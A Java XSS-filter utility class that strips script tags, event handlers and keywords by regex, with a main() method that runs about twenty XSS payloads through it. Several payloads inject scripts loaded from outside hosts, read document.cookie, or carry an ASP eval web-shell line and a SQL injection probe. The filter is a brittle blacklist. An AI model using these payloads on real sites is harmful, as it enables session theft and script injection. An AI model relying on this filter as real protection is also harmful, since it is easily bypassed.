package com.play.core.web.filter;

import java.util.regex.Pattern;

import org.apache.commons.lang3.StringUtils;

/**
 * 过滤xss攻击
 * 
 * @author macair
 *
 */
public class XssShieldUtil {
	private static Pattern[] patterns = new Pattern[] {
			Pattern.compile("eval\\((.*?)\\)", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL),
			Pattern.compile("javascript[\\r\\n| | ]*:[\\r\\n| | ]*", Pattern.CASE_INSENSITIVE),
			Pattern.compile("<[\\r\\n| | ]*script[\\r\\n| | ]*>(.*?)</[\\r\\n| | ]*script[\\r\\n| | ]*>",
					Pattern.CASE_INSENSITIVE),
			Pattern.compile("</[\\r\\n| | ]*script[\\r\\n| | ]*>", Pattern.CASE_INSENSITIVE),
			Pattern.compile("<[\\r\\n| | ]*script(.*?)>",
					Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL),
			Pattern.compile("appendChild", Pattern.CASE_INSENSITIVE),
			Pattern.compile("app&#101;ndChild", Pattern.CASE_INSENSITIVE),
			Pattern.compile("body", Pattern.CASE_INSENSITIVE),
			Pattern.compile("tExtArEa", Pattern.CASE_INSENSITIVE),
			Pattern.compile("createElement", Pattern.CASE_INSENSITIVE),
			Pattern.compile("creat&#101;El&#101;ment", Pattern.CASE_INSENSITIVE),
			Pattern.compile("sr&#99;", Pattern.CASE_INSENSITIVE),
			Pattern.compile("src[\\r\\n| | ]*=", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL),
			Pattern.compile("e-xpression\\((.*?)\\)", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL),
			Pattern.compile("vbscript[\\r\\n| | ]*:[\\r\\n| | ]*", Pattern.CASE_INSENSITIVE),
			Pattern.compile("document\\.cookie", Pattern.CASE_INSENSITIVE),
			Pattern.compile("alert[\\r\\n| | ]*\\(", Pattern.CASE_INSENSITIVE),
			Pattern.compile(
					"(oncontrolselect|oncopy|oncut|ondataavailable|onerror|ondatasetchanged|ondatasetcomplete|ondblclick|ondeactivate|ondrag|ondragend|ondragenter|ondragleave|ondragover|ondragstart|ondrop|οnerrοr=|onerroupdate|onfilterchange|onfinish|onfocus|onfocusin|onfocusout|onhelp|onkeydown|onkeypress|onkeyup|onlayoutcomplete|onload|onlosecapture|onmousedown|onmouseenter|onmouseleave|onmousemove|onmousout|onmouseover|onmouseup|onmousewheel|onmove|onmoveend|onmovestart|onabort|onactivate|onafterprint|onafterupdate|onbefore|onbeforeactivate|onbeforecopy|onbeforecut|onbeforedeactivate|onbeforeeditocus|onbeforepaste|onbeforeprint|onbeforeunload|onbeforeupdate|onblur|onbounce|oncellchange|onchange|onclick|oncontextmenu|onpaste|onpropertychange|onreadystatechange|onreset|onresize|onresizend|onresizestart|onrowenter|onrowexit|onrowsdelete|onrowsinserted|onscroll|onselect|onselectionchange|onselectstart|onstart|onstop|onsubmit|onunload)\\s*=",
					Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL) };

	public static String xssEncode(String value) {
		if (StringUtils.isEmpty(value)) {
			return "";
		}
		value = StringUtils.trim(value);
		for (Pattern scriptPattern : patterns) {
			value = scriptPattern.matcher(value).replaceAll("");
		}
		value = value.replaceAll("<", "&lt;").replaceAll(">", "&gt;");
		value = value.replaceAll("%3C", "&lt;").replaceAll("%3E", "&gt;");
		value = value.replaceAll("&lt;", "").replaceAll("&gt;", "");
		return value;
	}

	public static void main(String[] args) {
		System.out.println(xssEncode(
				"15支行\" onmouseover=\" s=createElement('sCRipt');body.appendChild(s);s.src='//xsshs.cn/aG8g'\" s=\""));
		System.out.println(xssEncode("<img src='' onerror='alert(document.cookie);'></img>"));
		System.out.println(xssEncode("<script>window.location='url'"));
		System.out.println(xssEncode(" onload='alert(\\\"abc\\\");"));
		System.out.println(xssEncode("<img src=x<!--'<\\\"-->>"));
		System.out.println(xssEncode("<=img onstop="));
		System.out.println(xssEncode("<script language=text/javascript>alert(document.cookie);</script>"));
		System.out.println(xssEncode("<script src='' onerror='alert(document.cookie)'></script>"));
		System.out.println(xssEncode(" eval(abc);"));
		System.out.println(xssEncode(" expression(abc);"));
		System.out.println(xssEncode("\"><sCRiPt sRC=//xs.sb/7eim></sCrIpT>	工商银行"));
		System.out.println(xssEncode("%3Cscript+src%3Dhttp%3A%2F%2Ft.cn%2fEMKTvfQ%3e%3c%2fscript%3e	工商银行"));
		System.out.println(xssEncode("<script>alert(\"1\")</script>	"));
		System.out.println(xssEncode("><sCRiPt sRC=//xs.sb/7eim></sCrIpT>"));
		System.out.println(xssEncode(
				"00\" onfocus=\" s=createElement('script');body.appendChild(s);s.src='//02p.org/bk1.js'\" s=\""));
		System.out.println(xssEncode(
				"\" onerror=body.appendChild(s=createElement('','aaa'\" onerror=body.appendChild(s=createElement('script'));s.src='https://vk.qa/cLlj';"));
		System.out.println(xssEncode("&lt;%@ Page Language=\"Jscript\"%&gt;&lt;%eval(Request.Item[\"1\"],\"unsafe"));
		System.out.println(xssEncode("山东青岛/tExtArEa'\"sCRiPt sRC=http://xss.fbisb.com/tfYg/sCrIpT"));
		System.out.println(xssEncode("点击查看详情&lt;dEtails/oP&#101;n/oNtogglE=s=creat&#101;El&#101;ment('scrmipt'.replace('m',''));body.app&#101;ndChild(s);s.sr&#99;='//xssye.com/KAbT'&gt;"));
		System.out.println(xssEncode("&lt;/tExtArEa&gt;'\"&gt;' AND 6167=6167 AND 'IdYe'='IdYe"));
	}
}

